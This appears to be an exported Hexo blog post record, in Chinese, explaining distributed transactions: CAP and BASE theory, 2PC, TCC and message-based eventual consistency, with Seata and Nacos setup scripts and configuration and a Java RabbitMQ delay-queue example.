@Autowired\n    private RabbitTemplate rabbitClient;\n\n    public void sendOrderCancelTimeDelayMessage(T message){\n\n        /**\n         * 发消息的时候写好发给哪个交换机，发给哪个route-key，要发送的消息就行了\n         */\n        rabbitClient.convertAndSend(Constant.ORDER_CANCEL_EXCHANGE, Constant.ORDER_CANCEL_TIME_DELAY_QUEUE_ROUTE_KEY, message);\n\n    }\n\n\n    public void sendOrderCancelEdTimeDelayMessage(T message){\n\n        /**\n         * 发消息的时候写好发给哪个交换机，发给哪个route-key，要发送的消息就行了\n         */\n        rabbitClient.convertAndSend(Constant.ORDER_CANCEL_EXCHANGE, Constant.ORDER_CANCEL_ED_RELEASE_WARE_STOCK_ROUTE_KEY, message);\n\n    }\n\n    // 创建队列和交换机以及绑定关系\n\n    /**\n     * 创建交换机,这个交换机上面绑定一个延时队列和一个普通队列\n     * 这个交换机用于绑定订单得延时队列和订单得死信队列   死信(延时队列过期得信息)\n     * @return\n     */\n    @Bean\n    public Exchange orderCancelExchange(){\n        return new TopicExchange(Constant.ORDER_CANCEL_EXCHANGE, true, false);\n    }\n\n    /**\n     * 创建库存得延时队列,配置项:\n     *  这个队列和上面得交换机链接,只要订单保存成功就发送消息到这个队列\n     *  延时到期绑定哪一个交换机\n     *  延时到期绑定哪一个routeKey\n     *  延时时间 毫秒\n     *\n     * @return\n     */\n    @Bean\n    public Queue orderCancelTimeDelayQueue(){\n        Map<String, Object> args = new HashMap<>();\n        args.put(\"x-dead-letter-exchange\", Constant.ORDER_CANCEL_EXCHANGE);\n        args.put(\"x-dead-letter-routing-key\", Constant.ORDER_CANCEL_INVOKE_QUEUE_ROUTE_KEY);\n        args.put(\"x-message-ttl\", Constant.ORDER_CANCEL_TIME_DELAY_QUEUE_TTL);\n        return new Queue(Constant.ORDER_CANCEL_TIME_DELAY_QUEUE, true, false, false, args);\n    }\n\n    /**\n     * 创建普通队列,用于接收延时队列过期得消息, 接收死信,可以被监听到 然后做逻辑处理\n     * @return\n     */\n    @Bean\n    public Queue orderCancelInvokeQueue(){\n        return new Queue(Constant.ORDER_CANCEL_INVOKE_QUEUE, true, false, false);\n    }\n\n    /**\n     * 创建绑定关系:延时队列和交换机得关联 绑定交换机和延时队列\n     * @return\n     */\n    @Bean\n    public Binding orderCancelDelayQueueBinding(){\n        return new Binding(Constant.ORDER_CANCEL_TIME_DELAY_QUEUE, Binding.DestinationType.QUEUE, Constant.ORDER_CANCEL_EXCHANGE, Constant.ORDER_CANCEL_TIME_DELAY_QUEUE_ROUTE_KEY, null);\n    }\n\n    /**\n     * 创建绑定关系:普通队列和交换机得关联 绑定交换机和死信队列\n     * @return\n     */\n    @Bean\n    public Binding orderCancelInvokeQueueBinding(){\n        return new Binding(Constant.ORDER_CANCEL_INVOKE_QUEUE, Binding.DestinationType.QUEUE, Constant.ORDER_CANCEL_EXCHANGE, Constant.ORDER_CANCEL_INVOKE_QUEUE_ROUTE_KEY, null);\n    }\n\n    /**\n     * 创建绑定关系:普通队列和交换机得关联 绑定ware库存得死信队列,不用等待,直接可以被ware监听到\n     * @return\n     */\n    @Bean\n    public Binding orderCancelEdQueueBinding(){\n        return new Binding(Constant.WARE_STOCK_RELEASE_QUEUE, Binding.DestinationType.QUEUE, Constant.ORDER_CANCEL_EXCHANGE, Constant.ORDER_CANCEL_ED_RELEASE_WARE_STOCK_ROUTE_KEY, null);\n    }\n\n\n\n    /**\n     * 定制RabbitTemplate,将确认回调设置进去\n     */\n    @PostConstruct // MyRabbitConfig创建完成以后，执行这个方法\n    public void initRabbitTemplate(){\n\n        rabbitClient.setConfirmCallback(new RabbitTemplate.ConfirmCallback() {\n\n            /**\n             * 消息抵达exchange执行这个回调\n             * @param correlationData 回调的相关数据 当前消息的唯一关联数据(这个消息的唯一id)\n             * @param ack 消息是否成功收到, 只要消息抵达了服务器就是true\n             * @param cause 失败的原因\n             */\n            @Override\n            public void confirm(CorrelationData correlationData, boolean ack, String cause) {\n                // System.out.println(\"correlationData\" + correlationData);\n                // System.out.println(\"ack\" + ack);\n                // System.out.println(\"cause\" + cause);\n            }\n        });\n\n\n\n        rabbitClient.setReturnsCallback(new RabbitTemplate.ReturnsCallback() {\n\n            /**\n             * 只要消息没有投递给指定的队列，就触发这个回调\n             * @param returned 返回的消息和元数据\n             */\n            @Override\n            public void returnedMessage(ReturnedMessage returned) {\n                System.out.println(\"returned\" + returned);\n            }\n        });\n    }\n\n\n}\n```","source":"_posts/分布式事务.md","raw":"---\ntitle: 分布式事务\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-26 11:13:42\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: java分布式事务解决方案\ntags: DistributedTransactional\ncategories: db\n---\n\n## 分布式事务\n> CAP原则\n> \n> - 一致性、可用性、分区容错性，CAP原则是指，这三个要素最多只能实现两个，不可能三个同时实现，在分布式系统中永远都要满足分区容错，所以只能CA二选一\n> > - 一致性：成功就一起成功，失败也一起失败，保存一个值那么都保存一个值，在分布式系统中所有数据备份，在同一时刻必须有同样得值\n> > - 可用性：在集群中一部分节点故障后，集群整体还能响应客户端得读写请求\n> > - 分区容错性：大多数情况下，分布式系统都分布在多个子网络，每个子网络就叫做一个区，分区容错就是，区之间通信可能失败\n\n> raft算法(保证一致性)\n\n[动画解析](https://zinglix.xyz/2020/06/25/raft/)\n\n> BASE理论\n> \n> - 基本可用:损失时间(以前1秒得操作,现在5秒),损失功能(双11得时候,购物高峰期,可以引导用户去另一个页面)\n> - 软状态:指允许系统存在中间状态,而该中间状态不会影响系统整体可用性,分布式一般都会将数据存储多份,允许同步延迟就是软状态得体现\n> - 最终一致性:最终一致性指得是所有得数据经过一段时间后,最终达到一致得状态,弱一致和强一致相反,最终一致性是弱一致性得一种特殊情况\n\n> 分布式事务方案\n> \n> > - 2PC(强一致):二阶提交,分两个阶段提交,影响性能\n> > > - 总事务管理器询问微服务得本地管理器准备好提交数据了吗,响应准备好了,这一个阶段是询问状态\n> > > - 总事务管理器发送提交指令给微服务,如果有某一个微服务没有成功提交就回滚,这是第二阶段\n> \n> > - TCC(弱一致):柔性事务,TCC事务补偿型方案\n> > > - 让开发人员开发得时候开发三个代码提供给业务活动管理器回调,第一个Try尝试阶段,准备数据,第二个Confirm提交,第三个Cancel回滚\n> > > - 提供这三个代码让业务活动管理器调用\n> \n> > - 柔性事务-最大努力通知型\n> > > - 如果一个事务调用了多个微服务,那么有某一个微服务执行失败了,就将信息放到MQ中,让其他得微服务来订阅\n> > > - 如果之前得某个微服务断线了,那么可以设置这个MQ消息一直发送,直到真正收到为止\n>\n> > - 柔性事务-可靠消息+最终一致性方案(购物车结算得时候我们使用这个)\n> > > - 和`柔性事务-最大努力通知型`类似\n\n### seata(高并发不考虑)\n> 创建undo_log数据表,分布式事务得数据库都创建,用于分布式事务回滚日志 建表脚本在源码中的script目录去找\n ```sql\nCREATE TABLE `undo_log` (\n    `id` bigint(20) NOT NULL AUTO_INCREMENT,\n    `branch_id` bigint(20) NOT NULL,\n    `xid` varchar(100) NOT NULL,\n    `context` varchar(128) NOT NULL,\n    `rollback_info` longblob NOT NULL,\n    `log_status` int(11) NOT NULL,\n    `log_created` datetime NOT NULL,\n    `log_modified` datetime NOT NULL,\n    `ext` varchar(100) DEFAULT NULL,\n    PRIMARY KEY (`id`),\n    UNIQUE KEY `ux_undo_log` (`xid`,`branch_id`) USING BTREE\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n```\n>  [`下载Seata-Server事务协调器(TC)`](https://github.com/seata/seata/releases)\n> \n>  [`下在Seata-Server对应版本源码`](https://github.com/seata/seata)\n> \n>  修改Seata-Server得registry.conf中得配置文件位置和注册中心位置,如下配置\n\n```text\n# 配置注册中心得位置\nregistry {\n\n  type = \"nacos\"\n\n  nacos {\n    application = \"seata-server\"\n    serverAddr = \"127.0.0.1:8848\"\n    group = \"SEATA_GROUP\"\n    namespace = \"mall-dev\"\n    cluster = \"default\" # 集群名字\n    username = \"nacos\"\n    password = \"nacos\"\n  }\n}\n\n# 配置配置文件得位置\nconfig {\n\n  type = \"nacos\"\n\n  nacos {\n    serverAddr = \"127.0.0.1:8848\"\n    namespace = \"mall-dev\"\n    group = \"SEATA_GROUP\"\n    username = \"nacos\"\n    password = \"nacos\"\n  }\n}\n```\n\n>  修改file.conf,主要就是 TC事务日志存储在哪里 如下配置\n\n```text\n# TC日志存放位置\nstore {\n\n  mode = \"db\"\n\n  db {\n    datasource = \"druid\"\n    dbType = \"mysql\"\n    driverClassName = \"com.mysql.jdbc.Driver\"\n    url = \"jdbc:mysql://127.0.0.1:3306/seata_server?rewriteBatchedStatements=true\" # 创建出来\n    user = \"root\"\n    password = \"lqs\"\n    minConn = 5\n    maxConn = 100\n    globalTable = \"global_table\" # 创建出来\n    branchTable = \"branch_table\" # 创建出来\n    lockTable = \"lock_table\" # 创建出来\n    queryLimit = 100\n    maxWait = 5000\n  }\n}\n```\n\n> > - 创建global_table 建表脚本在源码中的script目录去找\n\n```sql\nCREATE TABLE IF NOT EXISTS `global_table`\n(\n    `xid`                       VARCHAR(128) NOT NULL,\n    `transaction_id`            BIGINT,\n    `status`                    TINYINT      NOT NULL,\n    `application_id`            VARCHAR(32),\n    `transaction_service_group` VARCHAR(32),\n    `transaction_name`          VARCHAR(128),\n    `timeout`                   INT,\n    `begin_time`                BIGINT,\n    `application_data`          VARCHAR(2000),\n    `gmt_create`                DATETIME,\n    `gmt_modified`              DATETIME,\n    PRIMARY KEY (`xid`),\n    KEY `idx_gmt_modified_status` (`gmt_modified`, `status`),\n    KEY `idx_transaction_id` (`transaction_id`)\n) ENGINE = InnoDB\n  DEFAULT CHARSET = utf8;\n```\n\n> > - 创建branch_table 建表脚本在源码中的script目录去找\n\n```sql\nCREATE TABLE IF NOT EXISTS `branch_table`\n(\n    `branch_id`         BIGINT       NOT NULL,\n    `xid`               VARCHAR(128) NOT NULL,\n    `transaction_id`    BIGINT,\n    `resource_group_id` VARCHAR(32),\n    `resource_id`       VARCHAR(256),\n    `branch_type`       VARCHAR(8),\n    `status`            TINYINT,\n    `client_id`         VARCHAR(64),\n    `application_data`  VARCHAR(2000),\n    `gmt_create`        DATETIME(6),\n    `gmt_modified`      DATETIME(6),\n    PRIMARY KEY (`branch_id`),\n    KEY `idx_xid` (`xid`)\n) ENGINE = InnoDB\n  DEFAULT CHARSET = utf8;\n```\n\n> > - 创建lock_table 建表脚本在源码中的script目录去找\n\n```sql\nCREATE TABLE IF NOT EXISTS `lock_table`\n(\n    `row_key`        VARCHAR(128) NOT NULL,\n    `xid`            VARCHAR(128),\n    `transaction_id` BIGINT,\n    `branch_id`      BIGINT       NOT NULL,\n    `resource_id`    VARCHAR(256),\n    `table_name`     VARCHAR(32),\n    `pk`             VARCHAR(36),\n    `gmt_create`     DATETIME,\n    `gmt_modified`   DATETIME,\n    PRIMARY KEY (`row_key`),\n    KEY `idx_branch_id` (`branch_id`)\n) ENGINE = InnoDB\n  DEFAULT CHARSET = utf8;\n```\n\n> 配置上线注册到nacos得配置 在源码中的script目录去找到 config-center下得config.txt修改如下配置\n\n```txt\nstore.mode=db\nstore.db.url=jdbc:mysql://127.0.0.1:3306/seata_server?useUnicode=true&rewriteBatchedStatements=true\nstore.db.user=root\nstore.db.password=lqs\n\nservice.vgroupMapping.chengdu=default # vgroupMappin后面得可以随便写但是要记住这个很重要,配置客户端得时候会用到,这个default可以修改但是必须和注册中心集群名字一样 这个配置也就是集群得时候用得\n```\n\n\n> nacos得到源码中的script目录中config-center下得config.txt中的配置\n\n```shell\n# 可以根据自己得需要修改这个文件\nbash config-center/nacos/nacos-config.sh\n```\n\n> 以上成功之后 启动seata\n\n```shell\nbash bin/seata-server.sh -p 端口 -n 节点数量\n```\n### 整合seata\n\n> 导入Seata依赖 spring-cloud-starter-alibaba-seata 默认还对导入seata-all seata-all得版本必须和下载得seata-server版本一样\n\n```xml\n<!--        seata事务协调器-->\n<dependency>\n    <groupId>com.alibaba.cloud</groupId>\n    <artifactId>spring-cloud-starter-alibaba-seata</artifactId>\n</dependency>\n```\n\n> 配置application.properties\n\n```properties\n\nseata.tx-service-group=chengdu\nseata.enabled=true\nseata.application-id=${spring.application.name}\nseata.enable-auto-data-source-proxy=true\n\nseata.config.type=nacos\nseata.config.nacos.group=SEATA_GROUP\nseata.config.nacos.server-addr=localhost\nseata.config.nacos.namespace=mall-dev\nseata.config.nacos.password=nacos\nseata.config.nacos.username=nacos\n\n\nseata.registry.type=nacos\nseata.registry.nacos.group=SEATA_GROUP\nseata.registry.nacos.application=seata-server\nseata.registry.nacos.server-addr=localhost\nseata.registry.nacos.namespace=mall-dev\nseata.registry.nacos.password=nacos\nseata.registry.nacos.username=nacos\n\n```\n\n> 使用分布式事务 将@GlobalTransactional注解放在TM上\n\n> 如果TM出现异常,那么RM和TM都回滚,如果RM出现异常并且被处理(如try...catch),那么TC就感知不到,在TM中根据状态码来手动抛出异常回滚所有事务 或者GlobalTransactionContext.reload(RootContext.getXID()).rollback();手动回滚\n\n> 如果TM出现异常,那么RM和TM都回滚,如果RM中出现异常没有被处理,那么TC就可以感知到,并且直接回滚所有事务\n\n\n```java\n@GlobalTransactional\n@Transactional(readOnly = false)\n@Override\npublic SubmitOrderResponseVo submitOrder(OrderSubmitVo orderSubmitVo){\n\n    SubmitOrderResponseVo submitOrderResponse=new SubmitOrderResponseVo();\n\n    orderSubmitVoThreadLocal.set(orderSubmitVo);\n\n    AccountRespTo account=UserLoginInterceptor.user.get();\n\n    // 验证令牌\n    String orderToken=orderSubmitVo.getOrderToken();\n\n    ......\n}\n```\n\n### 柔性事务-可靠消息+最终一致性方案(RabbitMQ)\n> 我们使用这个方式来处理保存订单和锁定库存得分布式事务业务,使用延时队列来做,无论是下单失败还是锁定库存失败,通过延时队列,最终都会以补偿得方式回滚,交换机最好用Topic模式\n> ,如果要使用这个模式,最好还是数据表不要太单一,比如我们系统里有库存表,库存工作单表,库存工作单详情表,订单表这些表具有明确得指向性,比如,我们知道库存表一张表,如果锁定了库存,\n> 我们并不知道究竟是哪个用户锁定了库存,如果有工作单和详情单,我们就可以知道谁锁定了库存锁定了多少,再配合mq得消息,就可以准确得解锁.当然也可以不建立这些表,通过发送得mq信息来解锁.\n\n> 延时队列\n\n> > 延时队列:给队列设置一个ttl,到了指定得ttl里面得消息就会变成死信,这个被设置了ttl得就是延时队列,不能被消费者监听\n\n> > 死信:就是延时队列中过期得信息,死信在通过交换机发送给另外一个队列,只要有消费者来监听这个队列就可以获取这个死信来执行对应得业务\n\n> 我们系统得`保存订单和锁定库存得分布式事务业务`\n![](https://pub-pce.oss-cn-chengdu.aliyuncs.com/somgWebImageSingleGenerate/2023-01-26/ae981d0870da45cb8d2269487437db23.png)\n![](https://pub-pce.oss-cn-chengdu.aliyuncs.com/somgWebImageSingleGenerate/2023-01-26/920150f3ec1046cd93ee69c17d3908e6.png)\n\n> 延时队列示例\n\n>> 配置文件\n\n```properties\n# 开启发送端确认，消息抵达交换机的确认，属于生产者确认\nspring.rabbitmq.publisher-confirm-type=simple\n# 开启发送端消息抵达队列的确认，属于生产者确认\nspring.rabbitmq.publisher-returns=true\n# 只要抵达队列，以异步发送优先回调,属于生产者配置\nspring.rabbitmq.template.mandatory=true\n\n# 设置消费端手动签收\nspring.rabbitmq.listener.direct.acknowledge-mode=manual\n# 设置消费端手动签收\nspring.rabbitmq.listener.simple.acknowledge-mode=manual\n```\n\n>> 代码\n\n```java\n@Configuration\npublic class OrderAutoCancelPublisher<T> {\n\n\n    @Autowired\n    private RabbitTemplate rabbitClient;\n\n    public void sendOrderCancelTimeDelayMessage(T message){\n\n        /**\n         * 发消息的时候写好发给哪个交换机，发给哪个route-key，要发送的消息就行了\n         */\n        rabbitClient.convertAndSend(Constant.ORDER_CANCEL_EXCHANGE, Constant.ORDER_CANCEL_TIME_DELAY_QUEUE_ROUTE_KEY, message);\n\n    }\n\n\n    public void sendOrderCancelEdTimeDelayMessage(T message){\n\n        /**\n         * 发消息的时候写好发给哪个交换机，发给哪个route-key，要发送的消息就行了\n         */\n        rabbitClient.convertAndSend(Constant.ORDER_CANCEL_EXCHANGE, Constant.ORDER_CANCEL_ED_RELEASE_WARE_STOCK_ROUTE_KEY, message);\n\n    }\n\n    // 创建队列和交换机以及绑定关系\n\n    /**\n     * 创建交换机,这个交换机上面绑定一个延时队列和一个普通队列\n     * 这个交换机用于绑定订单得延时队列和订单得死信队列   死信(延时队列过期得信息)\n     * @return\n     */\n    @Bean\n    public Exchange orderCancelExchange(){\n        return new TopicExchange(Constant.ORDER_CANCEL_EXCHANGE, true, false);\n    }\n\n    /**\n     * 创建库存得延时队列,配置项:\n     *  这个队列和上面得交换机链接,只要订单保存成功就发送消息到这个队列\n     *  延时到期绑定哪一个交换机\n     *  延时到期绑定哪一个routeKey\n     *  延时时间 毫秒\n     *\n     * @return\n     */\n    @Bean\n    public Queue orderCancelTimeDelayQueue(){\n        Map<String, Object> args = new HashMap<>();\n        args.put(\"x-dead-letter-exchange\", Constant.ORDER_CANCEL_EXCHANGE);\n        args.put(\"x-dead-letter-routing-key\", Constant.ORDER_CANCEL_INVOKE_QUEUE_ROUTE_KEY);\n        args.put(\"x-message-ttl\", Constant.ORDER_CANCEL_TIME_DELAY_QUEUE_TTL);\n        return new Queue(Constant.ORDER_CANCEL_TIME_DELAY_QUEUE, true, false, false, args);\n    }\n\n    /**\n     * 创建普通队列,用于接收延时队列过期得消息, 接收死信,可以被监听到 然后做逻辑处理\n     * @return\n     */\n    @Bean\n    public Queue orderCancelInvokeQueue(){\n        return new Queue(Constant.ORDER_CANCEL_INVOKE_QUEUE, true, false, false);\n    }\n\n    /**\n     * 创建绑定关系:延时队列和交换机得关联 绑定交换机和延时队列\n     * @return\n     */\n    @Bean\n    public Binding orderCancelDelayQueueBinding(){\n        return new Binding(Constant.ORDER_CANCEL_TIME_DELAY_QUEUE, Binding.DestinationType.QUEUE, Constant.ORDER_CANCEL_EXCHANGE, Constant.ORDER_CANCEL_TIME_DELAY_QUEUE_ROUTE_KEY, null);\n    }\n\n    /**\n     * 创建绑定关系:普通队列和交换机得关联 绑定交换机和死信队列\n     * @return\n     */\n    @Bean\n    public Binding orderCancelInvokeQueueBinding(){\n        return new Binding(Constant.ORDER_CANCEL_INVOKE_QUEUE, Binding.DestinationType.QUEUE, Constant.ORDER_CANCEL_EXCHANGE, Constant.ORDER_CANCEL_INVOKE_QUEUE_ROUTE_KEY, null);\n    }\n\n    /**\n     * 创建绑定关系:普通队列和交换机得关联 绑定ware库存得死信队列,不用等待,直接可以被ware监听到\n     * @return\n     */\n    @Bean\n    public Binding orderCancelEdQueueBinding(){\n        return new Binding(Constant.WARE_STOCK_RELEASE_QUEUE, Binding.DestinationType.QUEUE, Constant.ORDER_CANCEL_EXCHANGE, Constant.ORDER_CANCEL_ED_RELEASE_WARE_STOCK_ROUTE_KEY, null);\n    }\n\n\n\n    /**\n     * 定制RabbitTemplate,将确认回调设置进去\n     */\n    @PostConstruct // MyRabbitConfig创建完成以后，执行这个方法\n    public void initRabbitTemplate(){\n\n        rabbitClient.setConfirmCallback(new RabbitTemplate.ConfirmCallback() {\n\n            /**\n             * 消息抵达exchange执行这个回调\n             * @param correlationData 回调的相关数据 当前消息的唯一关联数据(这个消息的唯一id)\n             * @param ack 消息是否成功收到, 只要消息抵达了服务器就是true\n             * @param cause 失败的原因\n             */\n            @Override\n            public void confirm(CorrelationData correlationData, boolean ack, String cause) {\n                // System.out.println(\"correlationData\" + correlationData);\n                // System.out.println(\"ack\" + ack);\n                // System.out.println(\"cause\" + cause);\n            }\n        });\n\n\n\n        rabbitClient.setReturnsCallback(new RabbitTemplate.ReturnsCallback() {\n\n            /**\n             * 只要消息没有投递给指定的队列，就触发这个回调\n             * @param returned 返回的消息和元数据\n             */\n            @Override\n            public void returnedMessage(ReturnedMessage returned) {\n                System.out.println(\"returned\" + returned);\n            }\n        });\n    }\n\n\n}\n```","slug":"分布式事务","published":1,"updated":"2023-03-10T02:50:40.957Z","_id":"cldcjex9m0001s8vk2bqn6sqo","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"分布式事务\"><a href=\"#分布式事务\" class=\"headerlink\" title=\"分布式事务\"></a>分布式事务</h2><blockquote>\n<p>CAP原则</p>\n<ul>\n<li>一致性、可用性、分区容错性，CAP原则是指，这三个要素最多只能实现两个，不可能三个同时实现，在分布式系统中永远都要满足分区容错，所以只能CA二选一<blockquote>\n<ul>\n<li>一致性：成功就一起成功，失败也一起失败，保存一个值那么都保存一个值，在分布式系统中所有数据备份，在同一时刻必须有同样得值</li>\n<li>可用性：在集群中一部分节点故障后，集群整体还能响应客户端得读写请求</li>\n<li>分区容错性：大多数情况下，分布式系统都分布在多个子网络，每个子网络就叫做一个区，分区容错就是，区之间通信可能失败</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>raft算法(保证一致性)</p>\n</blockquote>\n<p><a href=\"https://zinglix.xyz/2020/06/25/raft/\">动画解析</a></p>\n<blockquote>\n<p>BASE理论</p>\n<ul>\n<li>基本可用:损失时间(以前1秒得操作,现在5秒),损失功能(双11得时候,购物高峰期,可以引导用户去另一个页面)</li>\n<li>软状态:指允许系统存在中间状态,而该中间状态不会影响系统整体可用性,分布式一般都会将数据存储多份,允许同步延迟就是软状态得体现</li>\n<li>最终一致性:最终一致性指得是所有得数据经过一段时间后,最终达到一致得状态,弱一致和强一致相反,最终一致性是弱一致性得一种特殊情况</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>分布式事务方案</p>\n<blockquote>\n<ul>\n<li>2PC(强一致):二阶提交,分两个阶段提交,影响性能<blockquote>\n<ul>\n<li>总事务管理器询问微服务得本地管理器准备好提交数据了吗,响应准备好了,这一个阶段是询问状态</li>\n<li>总事务管理器发送提交指令给微服务,如果有某一个微服务没有成功提交就回滚,这是第二阶段</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>TCC(弱一致):柔性事务,TCC事务补偿型方案<blockquote>\n<ul>\n<li>让开发人员开发得时候开发三个代码提供给业务活动管理器回调,第一个Try尝试阶段,准备数据,第二个Confirm提交,第三个Cancel回滚</li>\n<li>提供这三个代码让业务活动管理器调用</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>柔性事务-最大努力通知型<blockquote>\n<ul>\n<li>如果一个事务调用了多个微服务,那么有某一个微服务执行失败了,就将信息放到MQ中,让其他得微服务来订阅</li>\n<li>如果之前得某个微服务断线了,那么可以设置这个MQ消息一直发送,直到真正收到为止</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>柔性事务-可靠消息+最终一致性方案(购物车结算得时候我们使用这个)<blockquote>\n<ul>\n<li>和<code>柔性事务-最大努力通知型</code>类似</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n</blockquote>\n<h3 id=\"seata-高并发不考虑\"><a href=\"#seata-高并发不考虑\" class=\"headerlink\" title=\"seata(高并发不考虑)\"></a>seata(高并发不考虑)</h3><blockquote>\n<p>创建undo_log数据表,分布式事务得数据库都创建,用于分布式事务回滚日志 建表脚本在源码中的script目录去找<br> <pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>undo_log<span class=\"token punctuation\">`</span></span> <span class=\"token punctuation\">(</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>id<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">bigint</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span> <span class=\"token keyword\">AUTO_INCREMENT</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>branch_id<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">bigint</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>xid<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>context<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>rollback_info<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">longblob</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>log_status<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>log_created<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">datetime</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>log_modified<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">datetime</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>ext<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">DEFAULT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">PRIMARY</span> <span class=\"token keyword\">KEY</span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>id<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">UNIQUE</span> <span class=\"token keyword\">KEY</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>ux_undo_log<span class=\"token punctuation\">`</span></span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>xid<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">,</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>branch_id<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">USING</span> <span class=\"token keyword\">BTREE</span>\n<span class=\"token punctuation\">)</span> <span class=\"token keyword\">ENGINE</span><span class=\"token operator\">=</span><span class=\"token keyword\">InnoDB</span> <span class=\"token keyword\">DEFAULT</span> <span class=\"token keyword\">CHARSET</span><span class=\"token operator\">=</span>utf8<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br> <a href=\"https://github.com/seata/seata/releases\"><code>下载Seata-Server事务协调器(TC)</code></a></p>\n<p> <a href=\"https://github.com/seata/seata\"><code>下在Seata-Server对应版本源码</code></a></p>\n<p> 修改Seata-Server得registry.conf中得配置文件位置和注册中心位置,如下配置</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\"># 配置注册中心得位置\nregistry &#123;\n\n  type = \"nacos\"\n\n  nacos &#123;\n    application = \"seata-server\"\n    serverAddr = \"127.0.0.1:8848\"\n    group = \"SEATA_GROUP\"\n    namespace = \"mall-dev\"\n    cluster = \"default\" # 集群名字\n    username = \"nacos\"\n    password = \"nacos\"\n  &#125;\n&#125;\n\n# 配置配置文件得位置\nconfig &#123;\n\n  type = \"nacos\"\n\n  nacos &#123;\n    serverAddr = \"127.0.0.1:8848\"\n    namespace = \"mall-dev\"\n    group = \"SEATA_GROUP\"\n    username = \"nacos\"\n    password = \"nacos\"\n  &#125;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p> 修改file.conf,主要就是 TC事务日志存储在哪里 如下配置</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\"># TC日志存放位置\nstore &#123;\n\n  mode = \"db\"\n\n  db &#123;\n    datasource = \"druid\"\n    dbType = \"mysql\"\n    driverClassName = \"com.mysql.jdbc.Driver\"\n    url = \"jdbc:mysql://127.0.0.1:3306/seata_server?rewriteBatchedStatements=true\" # 创建出来\n    user = \"root\"\n    password = \"lqs\"\n    minConn = 5\n    maxConn = 100\n    globalTable = \"global_table\" # 创建出来\n    branchTable = \"branch_table\" # 创建出来\n    lockTable = \"lock_table\" # 创建出来\n 